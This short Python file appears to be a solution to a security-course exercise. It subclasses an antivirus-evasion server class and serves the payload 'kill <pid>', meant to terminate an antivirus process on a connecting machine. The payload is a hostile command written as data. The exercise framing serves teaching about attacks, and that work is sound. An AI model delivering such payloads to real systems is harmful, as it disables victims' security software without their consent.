import evasion


class SolutionServer(evasion.EvadeAntivirusServer):

    def get_payload(self, pid: int) -> bytes:
        """This function returns the payload that will kill the antivirus.

        Notes:
        1. We recommend using str.encode("latin-1") to convert an `str`
           payload into the wanted `bytes` return type.

        Returns:
             The bytes of the payload.
        """
        return ('kill %d' % pid).encode('latin-1')

    def print_handler(self, product: bytes):
        # WARNING: DON'T EDIT THIS FUNCTION!
        print(product.decode('latin-1'))

    def evade_antivirus(self, pid: int):
        # WARNING: DON'T EDIT THIS FUNCTION!
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)
